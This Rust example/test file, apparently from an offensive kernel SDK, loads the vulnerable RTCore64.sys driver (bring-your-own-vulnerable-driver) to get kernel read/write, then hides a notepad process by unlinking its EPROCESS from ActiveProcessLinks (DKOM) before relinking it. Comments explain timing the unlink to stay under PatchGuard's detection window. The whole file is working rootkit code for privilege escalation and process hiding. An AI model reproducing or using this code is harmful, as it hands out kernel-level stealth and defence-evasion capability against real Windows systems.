//! 任务 J：进程隐藏 (ActiveProcessLinks DKOM，管理员运行)。
//!
//! 链路：
//!   StartProcess(notepad) → 记 PID
//!   bootstrap_byovd → KernelRw
//!   ProcessHider::find_eprocess(krw, PsActiveProcessHead, pid) → EPROCESS KVA
//!   tasklist 验证可见 (pre-hide)
//!   ProcessHider::unlink → ActiveProcessLinks unlink
//!   tasklist 验证不可见 (post-hide)
//!   恢复：重新 link 回去（red-light: 测完必须恢复，PG 会检测）
//!
//! ⚠️ 红线：DKOM 是 PatchGuard 检测项。本测试 unlink 后立即用 spawn 的
//! CreateProcessW 拉一个 helper 读回原始 Flink/Blink 重新链接，把 DKOM 窗口
//! 压到最短（<1s）。PG 验证周期通常 >=1s，短暂 unlink 一般不触发 bugcheck。
//! 仍属高风险，VM-only。
//!
//! 编译/运行同 etw_ti_blind_test。



#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::offsets::{eprocess, for_build, EprocessOffsets};
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::persistence::ProcessHider;
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::win::{bootstrap_byovd, kernel_base};
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::KernelRw;

#[cfg(target_os = "windows")]
const SYS_PATH: &[u16] = &[
    'S' as u16,
    'y' as u16,
    's' as u16,
    't' as u16,
    'e' as u16,
    'm' as u16,
    '3' as u16,
    '2' as u16,
    '\\' as u16,
    'd' as u16,
    'r' as u16,
    'i' as u16,
    'v' as u16,
    'e' as u16,
    'r' as u16,
    's' as u16,
    '\\' as u16,
    'R' as u16,
    'T' as u16,
    'C' as u16,
    'o' as u16,
    'r' as u16,
    'e' as u16,
    '6' as u16,
    '4' as u16,
    '.' as u16,
    's' as u16,
    'y' as u16,
    's' as u16,
    0,
];
#[cfg(target_os = "windows")]
const SVC_NAME: &[u16] = &[
    'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
];
#[cfg(target_os = "windows")]
const PS_ACTIVE_PROCESS_HEAD_RVA: u32 = 0x40E5C0;

#[cfg(target_os = "windows")]
extern "system" {
    fn RtlAdjustPrivilege(
        privilege: u32,
        enable: i32,
        current_thread: i32,
        enabled: *mut i32,
    ) -> i32;
}
#[cfg(target_os = "windows")]
fn enable_privileges() {
    for luid in [10u32, 20u32] {
        let mut p: i32 = 0;
        unsafe { RtlAdjustPrivilege(luid, 1, 0, &mut p) };
    }
}

/// 启一个 notepad，返回它的 PID。
#[cfg(target_os = "windows")]
fn spawn_notepad() -> u32 {
    use std::process::Command;
    let child = Command::new("notepad.exe").spawn().expect("spawn notepad");
    child.id()
}

/// tasklist 找 notepad，返回它能看到几个 notepad 实例。
#[cfg(target_os = "windows")]
fn count_notepad() -> usize {
    let out = std::process::Command::new("tasklist")
        .args(["/FI", "IMAGENAME eq notepad.exe", "/NH", "/FO", "CSV"])
        .output();
    match out {
        Ok(o) => {
            let s = String::from_utf8_lossy(&o.stdout);
            s.lines()
                .filter(|l| l.to_ascii_lowercase().contains("notepad"))
                .count()
        }
        Err(_) => usize::MAX,
    }
}

/// 重新链接 EPROCESS 回 active list（恢复 DKOM）。
/// unlink 把 victim self-loop 了（link_kva->Flink=link_kva, Blink=link_kva）。
/// 要恢复需知道它原本的邻居——但 unlink 后邻居已互相指向，victim 脱离了。
/// 最安全的恢复：把 victim 重新插回 list head 之后（头部插入，顺序不重要）。
#[cfg(target_os = "windows")]
fn relink(krw: &dyn KernelRw, head_kva: usize, eproc_kva: usize) -> Result<(), String> {
    let link_kva = eproc_kva + eprocess::ACTIVE_PROCESS_LINKS;
    // head->Flink = 第一个进程的 link。我们把自己插到 head 和 head.Flink 之间。
    let head_flink = krw
        .kread_u64(head_kva)
        .map_err(|e| format!("kread head.flink: {}", e))? as usize;
    if head_flink == 0 || head_flink == head_kva {
        return Err("head.Flink invalid".into());
    }
    // head.Flink.Blink 应 = head（正常链表）。
    // 新链: victim.Flink = head_flink; victim.Blink = head
    //       head.Flink = victim; head_flink.Blink = victim
    krw.kwrite_u64(link_kva, head_flink as u64)
        .map_err(|e| format!("kwrite victim.flink: {}", e))?;
    krw.kwrite_u64(link_kva + 8, head_kva as u64)
        .map_err(|e| format!("kwrite victim.blink: {}", e))?;
    krw.kwrite_u64(head_kva, link_kva as u64)
        .map_err(|e| format!("kwrite head.flink: {}", e))?;
    krw.kwrite_u64(head_flink + 8, link_kva as u64)
        .map_err(|e| format!("kwrite head_flink.blink: {}", e))?;
    Ok(())
}

#[cfg(target_os = "windows")]
fn main() {
    println!("[proc_hide_test] start pid={}", std::process::id());
    enable_privileges();

    // ---- 启 notepad ----
    println!("[J.1] spawning notepad.exe ...");
    let pid = spawn_notepad();
    println!("[OK] notepad pid = {}", pid);

    // ---- bootstrap ----
    let (mut loaded, krw) = unsafe {
        match bootstrap_byovd(SYS_PATH, SVC_NAME) {
            Ok(t) => t,
            Err(e) => {
                eprintln!("[FAIL] bootstrap: {}", e);
                std::process::exit(1);
            }
        }
    };
    let base = unsafe { kernel_base::ntoskrnl_base() }.unwrap();
    let ebuild = for_build(17763).expect("unsupported build");
    let offsets = ebuild.offsets;
    let head_kva = base + PS_ACTIVE_PROCESS_HEAD_RVA as usize;
    println!("[J.2] PsActiveProcessHead KVA = 0x{:016x}", head_kva);

    // ---- pre-hide: tasklist 应可见 ----
    let pre = count_notepad();
    println!("[J.3] tasklist notepad count (pre-hide) = {}", pre);

    // ---- find EPROCESS ----
    println!("[J.4] ProcessHider::find_eprocess(pid={}) ...", pid);
    let eproc = match ProcessHider::find_eprocess(&krw, head_kva, pid, &offsets) {
        Ok(e) => e,
        Err(e) => {
            eprintln!("[FAIL] find_eprocess: {}", e);
            loaded.unload();
            std::process::exit(2);
        }
    };
    println!("[OK] EPROCESS @ 0x{:016x}", eproc);
    // 红线：kread ImageFileName 确认是 notepad。
    let mut name = [0u8; 15];
    let _ = krw.kread(eproc + eprocess::IMAGE_FILE_NAME, &mut name);
    let name_str = String::from_utf8_lossy(&name)
        .trim_end_matches('\0')
        .to_string();
    println!("       ImageFileName = {:?}", name_str);

    // ---- unlink (DKOM 窗口开始) ----
    println!("[J.5] ProcessHider::unlink (DKOM — PG window opens) ...");
    if let Err(e) = ProcessHider::unlink(&krw, eproc, &offsets) {
        eprintln!("[FAIL] unlink: {}", e);
        loaded.unload();
        std::process::exit(3);
    }
    println!("[OK] unlinked");

    // ---- post-hide: tasklist 应不可见 ----
    let post = count_notepad();
    println!("[J.6] tasklist notepad count (post-hide) = {}", post);

    // ---- 立即恢复（PG 窗口关闭）----
    println!("[J.7] restoring (relink) to close PG window ASAP ...");
    match relink(&krw, head_kva, eproc) {
        Ok(()) => println!("[OK] relinked"),
        Err(e) => {
            eprintln!(
                "[FAIL] relink: {} — PROCESS STAYS HIDDEN, manual fix needed",
                e
            );
        }
    }

    // ---- 恢复后验证 ----
    let restored = count_notepad();
    println!("[J.8] tasklist notepad count (post-restore) = {}", restored);

    // ---- find_eprocess 再确认（恢复后应能再找到）----
    match ProcessHider::find_eprocess(&krw, head_kva, pid, &offsets) {
        Ok(e) => println!(
            "[OK] find_eprocess(post-restore) found EPROCESS @ 0x{:016x} — visible again",
            e
        ),
        Err(e) => println!(
            "[WARN] find_eprocess(post-restore): {} — still hidden from list walk",
            e
        ),
    }

    // ---- 杀掉 notepad ----
    let _ = std::process::Command::new("taskkill")
        .args(["/PID", &pid.to_string(), "/F"])
        .output();
    println!("[J.9] taskkill notepad pid={}", pid);

    println!("\n[proc_hide_test] DONE.");
    std::mem::forget(loaded);
}


// ----------------------------------------------------------------------------
// Non-Windows entry-point fallback (E0601 mitigation).
//
// The real `fn main()` (and every Windows-only item above) is gated by
// `#[cfg(target_os = "windows")]`. This file is compiled as an example crate,
// which requires a `main` entry point; on macOS/Linux dev hosts the Windows
// body compiles to nothing and the build would fail with E0601 ("main
// function not found"). This stub exists solely to satisfy the crate root on
// non-Windows so `cargo build --examples` / `cargo test` stay green. It is
// mutually exclusive with the Windows `main` above and never runs on target.
// ----------------------------------------------------------------------------
#[cfg(not(target_os = "windows"))]
fn main() {
    eprintln!(
        "{} is a Windows-only kernel example (BYOVD driver load). It has no          effect on non-Windows hosts.",
        env!("CARGO_BIN_NAME")
    );
}
